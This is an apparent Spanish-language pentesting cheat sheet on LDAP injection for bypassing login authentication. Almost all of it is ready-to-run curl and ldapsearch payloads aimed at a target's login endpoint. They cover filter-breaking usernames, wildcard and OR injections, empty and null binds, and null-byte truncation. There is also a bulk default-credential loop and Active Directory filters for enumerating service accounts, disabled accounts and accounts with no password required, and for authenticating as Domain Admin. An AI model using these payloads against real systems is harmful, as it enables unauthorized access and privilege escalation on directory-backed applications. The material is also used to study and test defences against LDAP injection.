---
aliases:
  - LDAP Auth Bypass
  - LDAP Login Bypass
  - LDAP Empty Bind
tags:
  - vuln/ldap-injection
  - vuln/auth-bypass
  - technique/initial-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[LDAP Injection]]"
---
# LDAP Injection - Auth Bypass

***

## Sub-Filter Injection en Login

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -d "username=*)(uid=*))(\|(uid=*&password=anything" https://target/login` | Auth bypass — login como primer user del directorio | Filter `(&(uid={u})(userPassword={p}))`. |
| `curl -d "username=*)(\|(uid=*&password=anything" https://target/login` | Variant simple con OR injection | Mismo filter. |
| `curl -d "username=admin)(&)&password=anything" https://target/login` | Login como `admin` con AND-true | App permite parens en username. |
| `curl -d "username=admin*&password=anything" https://target/login` | Wildcard match en uid → admin | Filter sustring `(uid={u}*)`. |
| `curl -d "username=*)(cn=*&password=anything" https://target/login` | Wildcard CN inject | Filter usa `cn=` en lugar de `uid=`. |
| `curl -d "username=*)(memberOf=cn=admin,*&password=anything" https://target/login` | Auth como user en group admin | Filter checkea memberOf. |
| `curl --data-urlencode "username=*)(\|(uid=*" --data-urlencode "password=*)(\|(uid=*" https://target/login` | Inject ambos campos a la vez | Apps que injectan ambos. |
| `curl --data-urlencode "username=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A&password=any" https://target/login` | URL-encoded payload | Filter naive sobre raw chars. |
^ldap-bypass-subfilter

### Filter típico vulnerable

```
# Backend filter:
(&(uid={username})(userPassword={password}))

# Atacante:
username = *)(uid=*))(|(uid=*
password = anything

# Filter resuelto:
(&(uid=*)(uid=*))(|(uid=*)(userPassword=anything))
       ^ true     ^ matches all users

# → first match = admin → login as admin
```

___

## Empty / NULL Bind

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -d "username=&password=" https://target/login` | Anonymous bind si server lo permite | Server config con `disallow bind_anon` ausente. |
| `curl -d "username=admin&password=" https://target/login` | Login como admin con empty pass | LDAP behavior: empty pass → anonymous → server puede autenticar. |
| `curl -d "username=admin&password= " https://target/login` (space) | Whitespace strip → anonymous | App strips whitespace antes de bind. |
| `curl --data-urlencode "username=admin%00&password=any" https://target/login` | Null byte truncation post-admin | Parser trunca en null. |
| `ldapsearch -H ldap://target -x -s base -b ""` | Anonymous bind contra server LDAP directo | Server expone LDAP en port 389. |
| `ldapsearch -H ldap://target -x -D "cn=admin" -w admin -b "dc=target,dc=com"` | Test default creds clásicos | Defaults: admin/admin, manager/secret, "Directory Manager"/empty. |
| `for user in admin manager root administrator; do for pass in '' admin password secret manager; do curl -s -d "username=$user&password=$pass" https://target/login \| grep -i success; done; done` | Bulk default creds | No conocés creds. |
^ldap-bypass-emptybind

___

## Filter Manipulation Variants

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -d "username=*)(\|(uid=*&password=any" https://target/login` | Auth bypass standard AND filter | Filter `(&(uid={u})(pass={p}))`. |
| `curl -d "username=admin*&password=any" https://target/login` | Wildcard match en OR filter | Filter `(\|(uid={u})(mail={u}))`. |
| `curl -d "username=*&password=any" https://target/login` | Match all users single-attr filter | Filter `(uid={u})` simple. |
| `curl -d "username=*)(active=*&password=any" https://target/login` | Skip active=true check | Filter incluye `(active=true)`. |
| `curl -d "username=*)(memberOf=*&password=any" https://target/login` | Skip memberOf restriction | Filter incluye memberOf clause. |
| `curl --data-urlencode "username=*~=admin&password=any" https://target/login` | Approx match phonetic | Filter usa `~=` operator. |
| `curl --data-urlencode "username=(uid:dn:caseIgnoreMatch:=admin)&password=any" https://target/login` | Extensible match injection | OpenLDAP extensible match feature. |
^ldap-bypass-filter-types

___

## Active Directory-Specific Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -d "username=*)(samAccountName=*&password=any" https://target/login` | AD user enumeration via samAccountName | Backend AD usa samAccountName. |
| `curl -d "username=*)(userPrincipalName=*&password=any" https://target/login` | UPN-based auth bypass | Backend acepta UPN format. |
| `curl -d "username=*)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=com&password=any" https://target/login` | Privesc — autenticar como Domain Admin | Filter checkea memberOf vs DA group. |
| `curl --data-urlencode "username=*)(userAccountControl:1.2.840.113556.1.4.803:=8192)&password=any" https://target/login` | Match accounts NEVER_EXPIRE | AD bitwise filter. |
| `curl --data-urlencode "username=*)(userAccountControl:1.2.840.113556.1.4.803:=2)&password=any" https://target/login` | Match disabled accounts | AD ACCOUNTDISABLE flag. |
| `curl --data-urlencode "username=*)(userAccountControl:1.2.840.113556.1.4.803:=32)&password=any" https://target/login` | Match PWD_NOTREQD accounts | Auth sin password set. |
| `curl -d "username=*)(servicePrincipalName=*&password=any" https://target/login` | Service accounts enum | Kerberoasting target discovery. |
| `curl -d "username=*)(objectSid=S-1-5-21-*&password=any" https://target/login` | SID-based filter inject | AD SID enumeration. |
^ldap-bypass-ad

***
